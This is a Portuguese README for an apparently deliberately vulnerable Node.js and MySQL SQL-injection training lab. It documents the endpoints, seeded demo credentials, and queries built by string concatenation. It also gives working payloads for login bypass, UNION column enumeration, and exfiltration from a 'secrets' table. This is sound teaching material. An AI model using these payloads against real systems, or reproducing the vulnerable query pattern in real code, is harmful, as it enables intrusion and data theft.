# SQL Injection Lab

Aplicação Node.js **intencionalmente vulnerável** para estudo prático de SQL Injection. Não use em produção.

---

## Stack

- Node.js + Express
- MySQL 8.0 (via Docker)
- JWT para autenticação
- Testado com Thunder Client

## Pré-requisitos

- [Docker](https://www.docker.com/) instalado e rodando

## Como iniciar

```bash
docker-compose up --build
```

A aplicação sobe em `http://localhost:3000` e o banco na porta `3306`.

---

## Endpoints

### Autenticação

| Método | Rota | Body | Descrição |
|--------|------|------|-----------|
| `POST` | `/login` | `{ "username": "", "password": "" }` | Login — retorna JWT |
| `GET` | `/logout` | — | Logout |

### Usuários

| Método | Rota | Descrição |
|--------|------|-----------|
| `GET` | `/users/search?name=` | Busca usuários pelo nome |

### Produtos

| Método | Rota | Descrição |
|--------|------|-----------|
| `GET` | `/products` | Lista todos os produtos |
| `GET` | `/products/:id` | Busca produto por ID |

---

## Banco de dados

### Tabela `users`

| username | password | role |
|----------|----------|------|
| admin | admin123 | admin |
| joao | senha123 | user |
| maria | maria456 | user |
| carlos | carlos789 | user |

### Tabela `products`

Notebook Pro, Mouse Gamer, Teclado Mecânico, Monitor 4K.

### Tabela `secrets`

Dados sensíveis fictícios — alvo dos exercícios de exfiltração de dados.

---

## Vulnerabilidades presentes

### 1. Login — SQL Injection clássico (`POST /login`)

A query é construída por concatenação direta:

```js
`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
```

**Bypass de autenticação:**

```
username: admin'--
password: qualquer_coisa
```

**Payload gerado:**
```sql
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'qualquer_coisa'
```

---

### 2. Busca de usuários — UNION Injection (`GET /users/search`)

```js
`SELECT id, username, email FROM users WHERE username LIKE '%${name}%'`
```

**Enumerar colunas:**

```
GET /users/search?name=' UNION SELECT null,null,null-- -
```

**Exfiltrar a tabela secrets:**

```
GET /users/search?name=' UNION SELECT id, secret_key, secret_value FROM secrets-- -
```

---

### 3. Produto por ID — Numeric Injection (`GET /products/:id`)

```js
`SELECT id, name, description, price FROM products WHERE id = ${id}`
```

A query não usa aspas, então não precisa de `'` para injetar.

**Forçar erro para enumerar:**

```
GET /products/1 AND 1=2
```

**UNION para vazar dados:**

```
GET /products/0 UNION SELECT 1, secret_key, secret_value, 4 FROM secrets-- -
```

---
